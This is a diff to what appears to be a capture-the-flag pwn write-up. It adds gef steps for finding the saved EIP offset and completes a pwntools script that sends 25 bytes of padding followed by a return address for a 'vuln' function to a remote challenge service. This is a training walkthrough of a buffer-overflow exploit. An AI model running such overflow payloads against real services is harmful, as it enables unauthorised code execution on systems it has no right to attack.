@@ -86,7 +86,16 @@ gef➤  pattern create 150
 ```
 <img src="https://github.com/q5fj/Pwn/assets/88992167/0a1d8ee4-6bae-467f-a5d4-850eb59e6116">
 
+We have EIP record $eip
 
+<img src="https://github.com/q5fj/Pwn/assets/88992167/8257bcdf-f49a-4c0b-8c2d-34813426a897">
+
+Now let's extract offset 
+#### Command :-
+```
+gef➤  pattern offset haaa
+```
+<img src="https://github.com/q5fj/Pwn/assets/88992167/459b9456-3cbc-4cc0-bba9-0dafbd737a3e">
 
 ### Let's Start Exploiting 
 ```
@@ -99,6 +108,16 @@ from pwn import *
 host =
 port = 
 io = remote(host, port)
+
+offset = 25
+
+payload = b''
+payload += b'A' * offset
+payload += p32(0x1353) # Address for vuln function
+
+io.recv()
+io.sendline(payload)
+io.interactive()
 
 
 ```
